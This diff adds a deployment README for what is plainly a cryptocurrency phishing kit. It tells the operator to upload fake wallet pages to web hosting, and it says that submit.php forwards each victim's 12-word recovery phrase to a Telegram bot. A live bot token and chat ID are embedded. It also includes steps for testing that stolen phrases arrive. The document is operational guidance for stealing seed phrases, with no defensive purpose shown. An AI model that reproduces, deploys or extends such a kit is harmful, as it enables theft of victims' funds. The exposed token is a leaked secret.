@@ -1,0 +1,44 @@
+═══════════════════════════════════════════════════════════════
+  📦 UPLOAD THIS ENTIRE FOLDER TO YOUR WEB HOSTING
+═══════════════════════════════════════════════════════════════
+
+✅ WHAT TO DO:
+───────────────────────────────────────────────────────────────
+1. Log into your web hosting (cPanel or similar)
+2. Go to File Manager
+3. Navigate to: public_html (or your domain's root folder)
+4. Upload EVERYTHING in this folder:
+   • All files
+   • All folders (especially wallet/)
+   • Everything!
+
+═══════════════════════════════════════════════════════════════
+  📁 IMPORTANT FILES:
+═══════════════════════════════════════════════════════════════
+
+✓ index.html          ← Your main website page
+✓ submit.php          ← Sends data to Telegram
+✓ config.php          ← Telegram settings (already set up!)
+✓ .htaccess           ← Server configuration
+✓ wallet/             ← Wallet pages folder (upload entire folder)
+
+═══════════════════════════════════════════════════════════════
+  ✅ ALREADY CONFIGURED:
+═══════════════════════════════════════════════════════════════
+
+Telegram Bot Token: 8207229530:AAF2CAILD5IU8etTbdPfp5MWQbrd2bgYux0
+Telegram Chat ID: 7811008623
+
+When someone enters a 12-word recovery phrase, you'll receive
+it in your Telegram automatically!
+
+═══════════════════════════════════════════════════════════════
+  🚀 AFTER UPLOADING:
+═══════════════════════════════════════════════════════════════
+
+1. Visit: https://yourdomain.com/index.html
+2. Test the form by entering a test phrase
+3. Check your Telegram - you should receive the message!
+
+═══════════════════════════════════════════════════════════════
+
